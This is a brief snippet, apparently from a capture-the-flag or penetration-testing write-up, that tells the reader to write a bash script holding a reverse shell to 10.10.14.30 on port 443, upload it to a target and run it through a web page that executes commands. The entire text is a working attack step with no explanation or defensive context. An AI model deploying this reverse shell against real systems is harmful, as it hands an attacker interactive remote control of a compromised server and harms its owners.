Write shell file and upload it:  
#!/bin/bash  
  
bash -i >& /dev/tcp/10.10.14.30/443 0>&1  
  
Upload it and then run from web page as comand:  
$ bash shell